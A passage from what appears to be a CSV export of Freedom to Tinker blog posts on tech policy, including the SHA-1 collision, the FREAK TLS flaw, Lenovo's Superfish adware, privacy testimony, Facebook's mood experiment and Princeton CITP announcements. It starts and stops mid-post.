way to address that would be to improve the encrypted communication tools available on government-issued devices, while making sure to configure those tools to keep records and maintain accountability as legally required. That wouldn’t stop employees from using their personal devices because they want to avoid accountability–cheaters gonna cheat–but at least it would reduce the temptation to use personal devices to try to improve security. Finally, one has to wonder how this discussion is affected by the politics of encryption. I’ll write about that in a future post."
"411","2017-02-23","2023-03-24","https://freedom-to-tinker.com/2017/02/23/rip-sha-1/","Today’s cryptography news is that researchers have discovered a collision in the SHA-1 cryptographic hash function. Though long-expected, this is a notable milestone in the evolution of crypto standards. Kudos to Marc Stevens, Elie Bursztein, Pierre Karpma, Ange Albertine, and Yarik Markov of CWI Amsterdam and Google Research for their result. SHA-1 was standardized by NIST in 1995 for use as a cryptographic hash function (or simply “hash”). Hashes have many uses, most notably as unique short “fingerprints” for data. A secure hash will be collision-resistant, which means it is infeasible to find two files that have the same hash. One consequence of collision-resistance is that if you want to detect whether anyone has tampered with a file, you can just remember the hash of the file. This is nice because the hash will be small: a SHA-1 hash is only 20 bytes, and other popular hashes are typically 32 bytes. Later, if you want to verify that the file hasn’t changed, you can recompute the hash of the (possibly modified) file , and verify that the result is the same as the hash you remembered. If the hashes of two files are the same, then the files must be the same–otherwise the two files would constitute a collision. By 2011 it had become clear that SHA-1 was not as strong as expected. Any hash can be defeated by a brute-force search, so hashes are designed so that the cost of brute-force search is too high to be feasible. But methods had been discovered that reduced the cost of finding a collision by a factor of about 100,000 below the cost of a brute-force search. All was not lost, because even with that cost reduction, defeating SHA-1 was still massively costly by 2011 standards. But the writing was on the wall, and NIST deprecated SHA-1 in 2011, which is standards-speak for advising people to stop using it as soon as practical. The new result demonstrates a collision in SHA-1. The researchers found two PDF files that have the same hash. This required a lot of computation: 6500 machine-years on standard computers (CPUs), plus 100 machine-years on slightly specialized computers (GPUs). Today, some systems in the field still rely on SHA-1, despite stronger hashes like SHA-2 getting more use, and the presumably stronger SHA-3 standard was issued in 2015. It is well past time to stop using SHA-1, but the process of phasing it out has taken longer than expected. There are two lessons here about crypto standards. First, it can take a long time to phase out a standard, even if it is deprecated and known to be vulnerable. Second, the work by NIST and the crypto community to plan ahead, deprecate SHA-1 early, and push forward successor standards, will pay many dividends. [Post updated (24 Feb) to improve terminology (collision-resistant, rather than collision-free), and to reflect the correct status of the SHA-3 standard.]"
"412","2017-02-20","2023-03-24","https://freedom-to-tinker.com/2017/02/20/smart-contracts-neither-smart-not-contracts/","Karen Levy has an interesting new article critiquing blockchain-based “smart contracts.” The first part of her title, “Book-Smart, not Street-Smart,” sums up her point. Here’s a snippet: Though smart contracts do have some features that might serve the goals of social justice and fairness, I suggest that they are based on a thin conception of what law does, and how it does it. Smart contracts focus on the technical form of contract to the exclusion of the social contexts within which contracts operate, and the complex ways in which people use them. In the real world, contractual obligations are enforced through all kinds of social mechanisms other than formal adjudication—and contracts serve many functions that are not explicitly legal in nature, or even designed to be formally enforced. To review, “smart contracts” are a feature of some blockchain-based systems, which allow an interaction between multiple parties to be encoded as a set of rules which will be executed automatically by the system, so that neither the parties nor anyone else can prevent those rules from being enforced. There are lots of variations on the basic idea, which differ in aspects such as exactly what kind of code is used to program the rules, what kinds of actions can be expressed in a ruleset, and so on. A simple example is an escrow arrangement, where Alice puts some money into escrow, and the money is released to Bob later if an arbiter Charlie determines that Bob performed some required action; otherwise the money returns to Alice. An escrow mechanism can be encoded as a “smart contract” so that once put into escrow the funds can only be disbursed to Alice or Bob, and only as specified by Charlie. Additional features, such as (say) splitting the money 50/50 between Alice and Bob if Charlie fails to act, can be built in. Indeed, the whole idea is that complicated rules can be encoded and then automatically executed with no dispute or appeal possible. Karen’s argument, that contracts serve functions that are not merely legal, is correct–and that is one reason why “smart contracts” may not be street-smart. But in addition to failing to do the non-legal work that contracts do, “smart contracts” also fail to do much of the legal work that contracts do, because they don’t work in the same way as contracts. To give just one example, a legal contract need not try to anticipate absolutely every relevant event that might occur. If some weird thing happens that is not envisioned in a regular legal contract, the parties can work out a modification to the contract that seems reasonable to them, and failing that, a judge might decide the outcome, subject to established legal principles. Similarly, a single error or “bug” in writing a regular contract, causing its literal meaning to differ from what the parties intended, is unlikely to lead to extreme results because the legal system will often resolve such a problem by trying to be reasonable. Contrast this with “smart contracts” where a bug in a “contract’s” code can lead to a perverse result that may allow one party to exploit the bug, extracting much of the value out of the arrangement with no recourse for the other parties. That’s what happened with the DAO in Ethereum, leading to a controversial attempt to unwind a legal-according-to-the-rules set of transactions, and dividing the Ethereum community. So if “smart contracts” may not be smart, and may not be contracts, what are they? It’s best to think of them not as contracts but as mechanisms. A mechanism is a sort of virtual machine that will do exactly what it is designed to do. Like an industrial machine, which can cause terrible damage if it’s not designed very carefully for safety or if it is used thoughtlessly, a mechanism can cause harm unless designed and used with great care. That said, in some circumstances a mechanism will be exactly what you need. Discarding the term “smart contract” which promises too much in both respects–being sometimes not smart and sometimes unlike a contract–and instead thinking of these virtual objects as nothing more or less than mindless mechanisms is not only more accurate, but also more likely to lead to more prudent application of this powerful idea."
"413","2017-02-15","2023-03-24","https://freedom-to-tinker.com/2017/02/15/regulation-and-anti-regulation/","[Hi, Freedom to Tinker readers. I’m back at Princeton, having completed my tour of duty as Deputy U.S. CTO, so I can resume writing here. I’ll start with some posts on specific topics, like the one below. As time goes on, I’ll have a lot more to say about what I learned. –Ed Felten] Politicians often talk about regulation as hindering business and economic development. Witness President Trump’s executive order that tries to reduce the number of Federal regulations. Sometimes regulation inhibits innovation and limits freedom of action. But often regulation acts to open up new opportunities. A good example is the FAA’s “Part 107” rule that was announced last summer. This rule established requirements for commercial flights of drones up to 55 pounds. For the first time, commercial flights became possible without requiring special permission from the FAA, as long as certain restrictions were followed: fly below 400 feet; avoid airports and other special facilities; don’t fly at night; don’t fly over people; and maintain visual line of sight to the drone. Because flying aircraft in the national airspace is forbidden by default, for obvious safety reasons, regulation that permits flight, within limits, has the effect of expanding rather than reducing what companies and individuals can do. Part 107 made more types of drone flights legal. This has already been an important enabler of beneficial innovation and use of drones. But the FAA’s work is not done. The agency had been planning a series of follow-on rules designed to relax the boundaries of Part 107, to allow flight over people, beyond visual line of sight, and so on, as it became clear how to do so safely. Will the new executive order make this more difficult? It’s hard to tell, because many aspects of the order are unclear or await further clarification from the Office of Management and Budget. But a policy that creates new barriers to the FAA responsibly loosening the restrictions on drone flights will not increase freedom and will not benefit the American people. I hope the interpretation and implementation of the new executive order accounts for the full range of regulatory actions. A policy that starts out assuming that regulation limits action too much, and thereby inhibits innovation and economic growth, may or may not be correct. But a policy that tries to prevent all action by regulatory agencies cannot be the right approach for the American people, especially if the goal is to reduce the burden imposed by regulation."
"414","2015-03-03","2023-03-24","https://freedom-to-tinker.com/2015/03/03/freak-attack-the-chickens-of-90s-crypto-restriction-come-home-to-roost/","Today researchers disclosed a new security flaw in TLS/SSL, the protocol used to secure web connections. The flaw is significant in itself, but it is also a good example of what can go wrong when government asks to build weaknesses into security systems. Back in the early 1990s, it was illegal to export most products from the U.S. if they had strong cryptography. To be exportable, a system had to use small keys that could be defeated by a brute-force search over the (reduced) key space. Because of this, the secure web protocol, SSL, was designed to allow either party to a communication to ask to use a special export mode. [Note for crypto geeks: “export mode” refers to certain cipher suites whose names start with “EXP”.] When it became legal to export strong crypto, the export mode feature was not removed from the protocol because some software still depended on it. Export mode is still an option today. This creates the possibility that a network “man in the middle” (MITM) can downgrade the security of a connection. If Alice and Bob are setting up a connection, the MITM can tell Alice that Bob is asking for export mode, and vice versa. This kind of “downgrade attack” is well known, and the TLS/SSL protocol has features designed to detect it. In this case, for complicated reasons beyond the scope of this post, the anti-downgrade protections could be evaded by a clever MITM. Having tricked Alice and Bob into using export mode, an adversary could then crack the 512-bit RSA keys used in this mode. Back in the ‘90s that would have required a heavy-duty computation, but today it takes about 7 hours on Amazon EC2 and costs about $100. Many web sites are vulnerable to this attack, allowing an adversary in the network to spoof or spy on traffic to vulnerable sites. About 12% of popular sites appear to be vulnerable, including americanexpress.com, groupon.com, bloomberg.com, kohls.com, marriott.com, and usajobs.gov. Even the National Security Agency’s own site is vulnerable. That’s not a big national security problem in itself because NSA doesn’t distribute state secrets from its public site. But there is an important lesson here about the consequences of crypto policy decisions: the NSA’s actions in the ‘90s to weaken exportable cryptography boomeranged on the agency, undermining the security of its own site twenty years later. Next time you hear a government official ask to modify a security system to protect their own access to data, ask yourself: What are the side effects? How do we know we won’t regret this later?"
"415","2015-02-23","2023-03-24","https://freedom-to-tinker.com/2015/02/23/lenovo-pays-for-careless-product-decisions/","The discovery last week that Lenovo laptops had been shipping with preinstalled adware that left users wide open to security exploitation triggered a lot of righteous anger in the tech community. David Auerbach at Slate wrote that Lenovo had “betrayed its customers and sold out their security”. Whenever a big company does something so monumentally foolish, it’s worth stepping back and asking how this could have happened. But first, let’s review what happened. Lenovo laptops came preinstalled with adware from a company called Superfish, which intercepted users’ web traffic in order to insert ads. The adware would intercept even encrypted (https) connections, a capability it achieved by including software written by a company called Komodia. If the user tried to make a secure connection to, say, https://bank.com, the Komodia software would impersonate bank.com to the user’s computer, so that it could get its hands on the secure traffic that the user thought was going directly to the bank. The Komodia software succeeded at impersonation because it (1) modified the user’s computer to allow a certain private cryptographic key to vouch for the identity of any site, and then (2) using that private key, which was baked in to the Komodia software, to carry out the impersonation. Later, researchers discovered that in some cases Komodia accepted a site’s claimed identity without verification, making impersonation attacks even easier. That’s a somewhat involved scenario, but the upshot is this: anyone on the net could impersonate any site to any affected Lenovo laptop user. Users’ email, private files, finances, online health information, and so on were wide open. When this came to light, the fingerpointing began. Lenovo first said, implausibly, that the security problem was only theoretical, and anyway the software helped users by presenting them with ads for useful products. Later, Lenovo admitted error and pledged to issue a patch to close the hole. Superfish has said that its product is legitimate and the fault is Komodia’s. Komodia has been silent, as far as I can tell. A stranger to today’s tech market would ask: Why in the world would a company like Lenovo include in its product a security-critical component, made by a small unrelated company, that has not been carefully vetted? Yet this practice seems to be common, and especially where ads are concerned. Mobile apps often include third-party ad libraries, and many publishers allow unrelated parties, which they hope are only placing ad content, to include material (and often software code) on their pages. Unchecked third-party inclusions of code are a ticking time bomb for many companies. In Lenovo’s case, the bomb went off, but others are equally vulnerable. Superfish’s response has been a classic of security flaw denialism. Here’s an excerpt: Despite the false and misleading statements made by some media commentators and bloggers, the Superfish software does not present a security risk. In no way does Superfish store personal data or share such data with anyone. Unfortunately, in this situation a vulnerability was introduced unintentionally by a 3rd party. The only way to read this as anywhere close to true is to postulate that Komodia is an unrelated party whose software somehow got onto the same computer as Superfish’s—as opposed to something that Superfish shipped as part of its product. Not to mention that if there was an “unintentional” vulnerability, it could only have been the extra vulnerability discovered at the end. The original vulnerability, the use of a private key installed everywhere that could impersonate any site to any affected user, could only have been a deliberate design decision by Komodia. And there was plenty of reason to suspect trouble with Komodia’s product—if somebody says they can intercept other people’s encrypted communications, it’s a good guess that they are doing something irregular. If any good comes from this mess, it will be because companies learn from Lenovo’s experience and start paying closer attention to what they are including in their products. When a computer maker installs junkware on their systems, they are doing more than making a few pennies. They are putting their users at risk. Companies that respect their customers should refuse to do that."
"416","2015-02-02","2023-03-24","https://freedom-to-tinker.com/2015/02/02/in-partial-defense-of-the-seahawks-play-calling/","The conventional wisdom about last night’s Super Bowl is that the Seahawks made a game-losing mistake by running a passing play from the Patriots’ one yard line in the closing seconds. Some are calling it the worst Super Bowl play call ever. I disagree. I won’t claim it was the right call, but I do think it was reasonable. Let me explain why. To analyze the decision we have to put ourselves in the shoes of the Seahawks’ coaches at the time. They did not know that an opposing defender would make a spectacular interception. They knew that was possible—and needed to take it into account—but a fair analysis of the decision can’t use the hindsight knowledge we have now. With that established, let’s make a simple model of the Seahawks’ strategic choices. They needed a touchdown to win. It was second down, so they could run three plays. The clock was running down, so let’s assume that if they run two running plays, the clock will expire before they can get a third play off; but an incomplete pass on the first or second play will stop the clock and give them time to run a third play. There are three play sequences they can use: run-run, pass-run-run, run-pass-run. (Passing more than once is bad strategy.) Suppose that a run play with Marshawn Lynch scores 85% of the time, and gets stuffed at the line 15% of the time. If you run twice, there is a 2.25% chance you’ll get stuffed twice, so you win the game with 97.75% probability. Suppose that passing on second down has these results: score: 50%, incomplete: 49%, interception: 1%. So if you call the pass-run-run sequence, the game outcome probabilities are: score: 97.90%, stopped short: 1.10%, interception: 1%. The odds of winning are a tiny bit better than if you just ran twice. It’s counterintuitive that passing might be the right choice even though a running play is more likely to score. The reason it comes out this way is that you’re not passing instead of running, you’re passing because passing gets you an extra play and you can still try to run twice, absent a spectacular interception play by the opponent. Now you can quibble with these probability estimates; and you can argue that the Seahawks might have had time to do three run plays. Change these assumptions, and the strategic calculations are different. But the argument so far should establish that the Seahawks weren’t crazy to pass. The real kicker comes, though, when we consider the remaining option of run-pass-run. If the outcomes of a pass are still 50/49/1 on third down, then run-pass-run is a clear winner. But maybe a pass comes as less of a surprise on third down, so the outcomes of a pass might be worse. Even so, run-pass-run turns out to be the best strategy. For example, if the outcomes of a third-down pass are score: 25%, incomplete: 73%, interception: 2%, the run-pass-run strategy still scores 98.06% of the time, which is better than either of the other options. The conclusion that run-pass-run is the best sequence is fairly robust against changes in the probability assumptions. If it’s wrong, it’s probably because of the assumption that run-run-run isn’t an option. The Seahawks’ decision to pass on second down wasn’t crazy, but a better choice would have been to pass on third down. Announcers who said “just run twice” were giving bad advice. The Seahawks didn’t make a terrible play call; they made a reasonable choice but were defeated by a great defensive play."
"417","2014-12-02","2023-03-24","https://freedom-to-tinker.com/2014/12/02/information-sharing-should-include-the-public/","The FBI recently issued a warning to U.S. businesses about the possibility of foreign-based malware attacks. According to a Reuters story by Jim Finkle: The five-page, confidential “flash” FBI warning issued to businesses late on Monday provided some technical details about the malicious software used in the attack. It provided advice on how to respond to the malware and asked businesses to contact the FBI if they identified similar malware. The report said the malware overrides all data on hard drives of computers, including the master boot record, which prevents them from booting up. “The overwriting of the data files will make it extremely difficult and costly, if not impossible, to recover the data using standard forensic methods,” the report said. The document was sent to security staff at some U.S. companies in an email that asked them not to share the information. The information found its way to the press, as one would expect of widely-shared information that is of public interest. My question is this: Why didn’t they inform the public? A great many vulnerable computers exist outside of companies, and those computers need to be protected. And yet some people in government treat public discussion of security risks as being harmful in itself. Here’s the FBI spokesman, commenting to Reuters: “The FBI routinely advises private industry of various cyber threat indicators observed during the course of our investigations,” [FBI spokesman Joshua Campbell] said. “This data is provided in order to help systems administrators guard against the actions of persistent cyber criminals.” This is good, but why limit it to “private industry”? Why not inform everyone who needs to know? It’s hard to think of a legitimate reason to keep this information secret. Everybody knows that this malware was used to attack Sony Pictures. And it must be obvious to the attackers that the postmortem at Sony will reveal the workings of the malware to Sony, its consultants, and the U.S. government. These facts are not secrets, let alone secrets that are worth protecting at the cost of putting the public at risk. The secrecy is probably designed to protect somebody from embarrassment. If that somebody is Sony, it’s not working—the Sony attack is well known at this point. Perhaps the goal is to keep from embarrassing somebody in the government. One effect of the secrecy is to make it harder for citizens to hold the government accountable for the consequences of its cybersecurity policy."
"418","2014-11-12","2023-03-24","https://freedom-to-tinker.com/2014/11/12/pclob-testimony-on-defining-privacy/","This morning I’m testifying at a hearing of the Privacy and Civil Liberties Oversight Board, on the topic of “Defining Privacy”. Here is the text of my oral testimony. (This is the text as prepared; there might be minor deviations when I deliver it.) [Update (Nov. 16): video stream of my panel is now available.] Thank you for the opportunity to testify today. My name is Ed Felten. I am the Kahn Professor of Computer Science and Public Affairs at Princeton University. Today I will offer my perspective as a computer scientist on how changing data practices have affected how we think about privacy. I will talk about both commercial and government data practices because the two are closely connected. We can think of today’s data practices in terms of a three-stage pipeline: first, collect data; second, merge data items; and third, analyze the data to infer facts about people. The first stage collects information. In our daily lives, we disclose information directly to people and organizations. Even when we are not disclosing information explicitly, more and more of what we do, online and offline, is recorded. Online services often attach unique identifiers to us and our devices, and the records of what we do are tagged with those identifiers. The second stage of the pipeline merges the data. Information might be collected in larger or smaller units. But if two data files can be determined to correspond to the same person—for example, because they both contain the same unique identifier—the two files can be merged. Merging can create an avalanche effect—merged files convey more precise knowledge about a user’s identity and unique behaviors, and this precision helps to enable further merging. One file might contain detailed information about behavior; another might precisely identify a person; merging the two will link behavior to identity. The third stage of the pipeline uses big data methods such as predictive analytics to infer facts about people. One famous example is when the retailer Target used purchases of products such as skin lotion to infer pregnancy. Today’s machine learning methods often enable sensitive information to be inferred from seemingly less sensitive data. Inferences also have an avalanche effect—each inference becomes another data point to be used in making further inferences. Predictive analytics are most effective in inferring status when many positive and negative examples are given. For example, Target used many examples of both pregnant and non-pregnant women to build its predictive model. By contrast, a predictive model that tried to identify terrorists from everyday behavioral data would expect much less success because there are very few examples of known terrorists in the U.S. population. With that technical background, let me discuss a few implications. First, the consequences of collecting a data item can be difficult to predict. Even if an item, on its face, does not seem to convey identifying information, and even if its contents seem harmless in isolation, its collection could have significant downstream effects. We must account for the mosaic effect—in which isolated, seemingly unremarkable data items combine to paint a vivid, specific picture. One of the main lessons of recent technical scholarship on privacy is the power of the mosaic effect. To understand what follows from collecting an item, we have to think about how that item can be merged with other available data, and how the merged data can in turn be used to infer information about people. We have to take into account the avalanche effects that can occur in both the merging and the inference stages. For example, the information that the holder of a certain loyalty card account number purchased skin lotion on a certain date might turn out to be the key fact that leads the retailer to an inference that a specific identifiable woman is pregnant. Similarly, phone call metadata, when collected in large volume, has been shown to enable predictions about social status, affiliation, employment, health, and personality traits. The second implication is that data handling systems have gotten much more complicated, especially in the merging and analysis stages—that is, the stages that come after collection. The sheer complexity of these systems makes it very difficult to understand, predict and control their use. Even the people who build and run these systems often fail to understand fully how they work—and this leads to unpleasant surprises such as compliance failures or data breaches. Complexity frustrates oversight, and makes compliance more difficult. Complexity makes failure more likely. Despite all best intentions, organizations often find themselves out of compliance with their own policies and obligations. Policymaking should acknowledge the fact that complex systems will often fail to perform as desired. Complex rules also make compliance more difficult. It is sometimes argued that we should abandon controls on collection and focus only on regulating data use. Limits on use offer more flexibility and precision—in theory, and sometimes in practice. But collection limits have advantages too. For example, it is easier to comply with a rule that limits collection than one that allows collection and puts elaborate limits on post-collection use; and collection limits make oversight and enforcement easier. Limiting collection can also nudge agencies to develop innovative approaches that meet their analytic needs while collecting less. The third implication is the synergy between commercial and government data practices. As an example, commercial entities put unique identifiers into most website accesses. A government eavesdropper collecting traffic can use these identifiers to link a user’s activities across different times and different online sites, and the eavesdropper can connect those activities to identifying information. Our research shows that, even if a user switches locations and devices, as most users do, an eavesdropper exploiting commercially-placed identifiers can reconstruct 60-75% of what the user does online and can usually link that data to the user’s identity. Users can engage in technical self-help against commercial data collection—and this works, up to a point. However, the people most likely to use these self-help tools are intelligence targets, so the commercial-government synergy is likely to sweep up more information about ordinary Americans than it does about intelligence targets. My final point is that technology offers many options beyond the most obvious technological approach of collecting all of the data, aggregating it in a single large data center, and then running canned analysis scripts on it. Advanced technical methods exist that can support necessary types of inference and analysis while collecting less data and more aggressively minimizing or preprocessing the data that is collected. It is often possible to allow limited uses of a data set without turning over the entire data set, or to keep data sets separate while allowing their contents to be combined in controlled ways. For example, cryptographic methods allow two parties who have separate data sets to find people who appear in both data sets, without disclosing their data to each other. There is a large and growing literature on privacy-preserving data analysis methods. Determining whether collection of particular data is truly necessary, whether data retention is truly needed, and what can be inferred from a particular analysis—these involve deeply technical questions. An oversight body should engage with these questions, using independent technical experts as needed. In the same way that the Board asks probing legal and policy questions of the agencies you oversee, I hope you will build a capacity to ask equally probing technical questions. Legal and policy oversight are most effective when combined with sophisticated and accurate technical analysis. Many independent technical experts and groups are able and willing to help you build this capacity. Thank you for your time. I look forward to your questions."
"419","2014-10-09","2023-03-24","https://freedom-to-tinker.com/2014/10/09/on-the-value-of-encrypting-your-phone/","This is a true story. Yesterday my phone crashed, and it wouldn’t reboot. Actually it would do nothing but reboot, over and over, with a seemingly different error message every time. I tried all of the tricks available to a technically handy person, and nothing worked—I couldn’t get it out of the crash-reboot cycle. So I need to send my phone in for service. The problem is: the phone is full of my data, and I don’t want a random service guy to get his hands on that data. Nor do I want a random service guy to be able to resume whatever logged-in sessions I had on apps and sites when the phone started crashing. What I want is to have the data on my phone encrypted. Strongly encrypted. Without a backdoor, because the service guy has no need to see my data and no right to get it. I would have wiped the phone’s memory before sending it in for service, but that would have required the phone to stay functional long enough to wipe itself. What I don’t want is for the service guy to have access to a “secure golden key” that gives him access to my data."
"420","2014-08-08","2023-03-24","https://freedom-to-tinker.com/2014/08/08/princeton-likely-to-rescind-grading-quota/","A Princeton faculty committee recommended yesterday that the university rescind its ten-year-old grading guideline that advises faculty to assign grades in the A range to at most 35% of students. The committee issued a report explaining its rationale. The recommendation will probably be accepted and implemented. It’s a good report, and I agree with its recommendation. Princeton would be better off without its grading quota. Before explaining why, it’s worth defusing some of the likely responses. Many commentators seem to presuppose that the distribution of grades is too high—but whether that is true is part of the debate. Similarly, many commentators assume that today’s students perform no better than students in the past, even though what evidence there is tends to point toward today’s students being better. Like many debates about academia, this one tends to be short on data, and people’s positions tend to be driven more by emotional and political predisposition than fact-based reasoning. As an example, it is widely asserted without data that the rise in average grades is a relatively recent development, usually tied to some cultural trend that the speaker dislikes. But the available information seems to show that grades have been rising for a long time. The best data I have seen on this is in Harry Lewis’s book, Excellence Without a Soul, which shows that grades at Harvard have been increasing slowly and steadily since at least the 1930’s and probably longer. Princeton’s recent experience, as recounted in the new faculty committee report, adds a new data point to the debate. The current policy, which is officially a “guideline” of 35% A’s rather than a formal quota, went into effect in 2005. And the data show that grades declined noticeably in the period from 2002 to 2004. After the policy went into effect in 2005, grades were flat for a few years and then started rising again. So what changed grading practices was not the 35% guideline but the simple fact that faculty were discussing and thinking more deeply about grading policy during the period before the current policy was even a concrete proposal. The policy that worked was “grade mindfully”, not “give 35% A’s”. Part of the problem with the current policy is that there isn’t a clearly stated theory of how it is supposed to operate. Partly this is because some of the policy’s most vocal advocates have tried to avoid admitting that in order to succeed the policy would have to give some students a B even if the faculty instructor thought they deserved an A. I once heard a sub-dean say that faculty weren’t supposed to change individual students’ grades; they were only supposed to lower the average grade. But of course you can’t lower the average without lowering some individuals. And if the goal is to get faculty to give different grades than they would give on their own, then the policy cannot succeed without changing some faculty grading decisions. The policy was a voluntary guideline rather than a quota—and some faculty chose to ignore it entirely—but still, if the policy was to have any effect at all, this could only occur by getting faculty to change some A’s to B’s. This tension is exposed in yesterday’s report, where the following story told by a student is described as “reveal[ing] poor behavior on the part of the faculty”: I received a 91 on a midterm exam in a [particular department] course this past fall (my concentration [i.e., major]), but the 91 was scratched out and replaced with an 88. When I asked my professor why he reduced my score, he told me that normally the paper would be an A-, but due to grade deflation, he was forced to lower several students’ grades to a B+. This kind of thing—changing an A- to a B+—had to happen if the policy was going to succeed. So one suspects that the professor’s “poor behavior” here was not changing the grade, but telling the student what was really going on. The report’s bottom line on the current policy is the same as mine: the policy’s goal of making grading more thoughtful and consistent was a good one, but the policy was not effective in achieving that goal. Now, I hope, we can learn from experience and kick off a new discussion of what grades are for and how we should assign them."
"421","2014-07-01","2023-03-24","https://freedom-to-tinker.com/2014/07/01/privacy-implications-of-social-media-manipulation/","The ethical debate about Facebook’s mood manipulation experiment has rightly focused on Facebook’s manipulation of what users saw, rather than the “pure privacy” issue of which information was collected and how it was used. It’s tempting to conclude that because Facebook didn’t change their data collection procedures, the experiment couldn’t possibly have affected users’ privacy interests. But that reasoning is incorrect. To simplify the discussion, let’s consider a hypothetical social network that I’ll call Wo. Wo lets people set up accounts and establish mutual friend relationships, as on Facebook. Rather than letting users post detailed status updates, Wo just lets a user set their status to either Smiley or Frowny. Users viewing the service then see photos of their friends, which are either smiling or frowning depending on the friend’s status. Wo keeps records of users’ status changes and when each user views their friends’ statuses. Wo learns certain things about their users by collecting and analyzing these records. They can tell how often a user is Smiley, how long a user’s Smiley and Frowny states persist, and how a user’s status correlates with the status of each friend and with the statuses of their friends in aggregate. What’s interesting is that if Wo manipulates what its users see, it can learn things about individual users that it couldn’t learn by observation alone. Suppose Wo wants to study “emotional contagion” among its users. In particular, it wants to know whether seeing more Frowny faces makes a user more likely to set their own status to Frowny. Wo could measure whether a user’s status tends to be correlated with her friends’ statuses. But correlation is not causation—Alice and Bob might be Frowny at the same time because something bad happened to their mutual friend Charlie, or because they live in the same town and the weather there is bad. If Wo really wants to know whether seeing Bob’s Frowny status tends to cause Alice to set her status to Frowny, the most effective method for Wo to learn this is a randomized trial, where they artificially manipulate what Alice sees. Some random fraction of the time, they show Alice a random status for Bob (rather than Bob’s actual status at the time), and they measure whether Alice is more Frowny when the false Bob-status is Frowny. (There are some methodological issues that Wo has to get right in such an experiment, but you get the idea.) This kind of experiment allows Wo to learn something about Alice that they would not have been able to learn by observation alone. In this case, they learn how manipulable Alice’s emotional status is. The knowledge they gain is statistical in nature—they might have, say, 83% statistical confidence that Alice is more manipulable than the average person—but statistical knowledge is real knowledge. A notable feature of this hypothetical experiment is that Alice probably couldn’t tell that it was going on. She would know that she was revealing her emotional state to Wo, but she wouldn’t know that Wo was learning how manipulable her emotions were. The key point is that the privacy impact of an interaction like this depends not only on which types of information are gathered, but also on which prompts were given to the user and how those prompts were chosen. Experimenting on users affects their privacy. Now: What does this hypothetical teach us about the privacy impact of Facebook’s experiment? What it tells us is that Facebook did learn some non-zero amount of information about the manipulability of individual users’ emotions. Given the published results of the study, the information learned about individual users was probably very weak, in the statistical sense of being correlated with the truth but only very weakly correlated, for the vast majority of users or perhaps for all users. To be clear, I am not concluding that Facebook necessarily learned much of anything about the manipulability of any particular user. Based on what we know I would bet against the experiment having revealed that kind of information about any individual. My point is simpler: experiments that manipulate user experience impact users’ privacy, and that privacy impact needs to be taken into account in evaluating the ethics of such experiments and in determining when users should be informed."
"422","2022-11-07","2023-03-24","https://freedom-to-tinker.com/2022/11/07/princeton-citp-launches-the-digital-witness-lab-to-help-journalists-track-bad-actors-on-platforms/","Read the full announcement and Q & A with Investigative Data Journalist and Engineer, Surya Mattu. Princeton University’s Center for Information Technology Policy (CITP) is excited to announce the launch of the Digital Witness Lab — an innovative research laboratory where engineers will design software and hardware tools to track the inner workings of social media platforms, and help journalists expose how they exploit users’ privacy and aid in the spread of misinformation and injustices globally. Based at CITP’s Sherrerd Hall office, the Lab is led by Surya Mattu, an award-winning data engineer and journalist whose most recent project with The Markup resulted in “Facebook Is Receiving Sensitive Medical Information from Hospital Websites,” an investigative news story that revealed 33 hospital websites and seven health system patient portals were collecting patients’ sensitive patient data through Facebook’s Meta Pixel code. “In our digital world, injustice often lurks in the shadows of digital platforms,” Mattu said. “This could be a Facebook post for housing that excludes people based on their demographic group. It could be an algorithm used to sort employment resumes where only one type of person passes the screening. In criminal justice, it could be a risk assessment algorithm that penalizes black defendants more than white defendants in criminal sentencing. “Algorithmic decisions in systems like these take place in proprietary software and apps,” he explained. “To bypass this barrier, the lab builds custom software and hardware to capture data from these platforms.” Mattu’s first undertaking at CITP is WhatsApp Watch — a research project in which engineers will monitor public WhatsApp groups to document the spread of misinformation. “We are excited to welcome Surya into the Princeton CITP community,” said Tithi Chattopadhyay, the Center’s executive director. “We look forward to building relationships with journalists and newsrooms that don’t have access to the types of digital tools Surya has a record of developing to support the critical work of investigative reporters. We are excited about the real world impact his work will have.” The Center for Information Technology Policy is a nonprofit, nonpartisan, interdisciplinary hub where researchers study the impact of digital technologies on society with the mission of informing policymakers, journalists, researchers, and the public for the good of society. CITP’s research priorities are Platforms & Digital Infrastructure, Privacy & Security, and Data Science, AI & Society."
"423","2021-10-18","2023-03-24","https://freedom-to-tinker.com/2021/10/18/citp-call-for-fellows-2022-23/","The Center for Information Technology Policy (CITP) is an interdisciplinary center at Princeton University. The Center is a nexus of expertise in technology, engineering, public policy, and the social sciences on campus. In keeping with the strong University tradition of service, the Center’s research, teaching, and events address digital technologies as they interact with society. CITP is seeking applications for the CITP Fellows Program for 2022-23. There are three tracks: • Postdoctoral track: for people who recently received a Ph.D. • Visiting Professional track: for academics and professionals (e.g., lawyers, journalists, technologists, former government officials, etc.) • Microsoft Visiting Professor track: for academics In this application cycle, we especially welcome applicants with interests in: Artificial Intelligence (AI), Data Science, Blockchain, Cryptocurrencies and Cryptography. The Center for Information Technology Policy Fellows Program offers scholars and practitioners from diverse backgrounds the opportunity to join the Center’s community. The goals of this fully-funded, in-residence program are to support people doing important research and policy engagement related to the Center’s mission and to enrich the Center’s intellectual life. Fellows typically will conduct research with members of the Center’s community and engage in the Center’s public programs. The fellows’ program provides freedom to pursue projects of interest and a stimulating intellectual environment. Application review will begin in the middle of December 2021. For more information and to apply, please see our Fellows Program webpage."
"424","2021-01-21","2023-03-24","https://freedom-to-tinker.com/2021/01/21/citps-summer-fellowship-program-for-training-public-interest-technologists/","In 2020, CITP launched the Public Interest Technology Summer Fellowship (PIT-SF) program aimed at rising juniors and seniors interested in getting first-hand experience working on technology policy at the federal, state and local level. The program is supported by the PIT-UN network and accepts students from member universities. We pay students a stipend and cover their reasonable travel costs. We are delighted to announce that applications are open for second year of the program. This post describes the firsthand reflections of three students from the program’s inaugural cohort. Who are we and where were our fellowships? Manish Nagireddy: I’m a sophomore at Carnegie Mellon studying statistics and machine learning. I worked in the AI/ML division of the Data Science and Analytics group at the Consumer Financial Protection Bureau (CFPB). Julia Meltzer: I’m a junior at Stanford, doing a major in Symbolic Systems (part linguistics, part computer science, part philosophy, and part psychology) and minoring in Ethics and Technology. I worked on the Policy Team for the NYC Mayor’s Office of the Chief Technology Officer (MoCTO). Meena Balan: I’m a junior at Georgetown studying International Politics with a concentration in International Law, Ethics, and Institutions, and minors in Russian and Computer Science. Last summer I had the opportunity to work with the Office of Policy Planning (OPP) at the Federal Trade Commission (FTC). What made you apply for the PIT-SF fellowship? Meena: As a student of both the practical and the qualitative aspects of technology, I am strongly drawn to the PIT field because of the opportunity to combine my 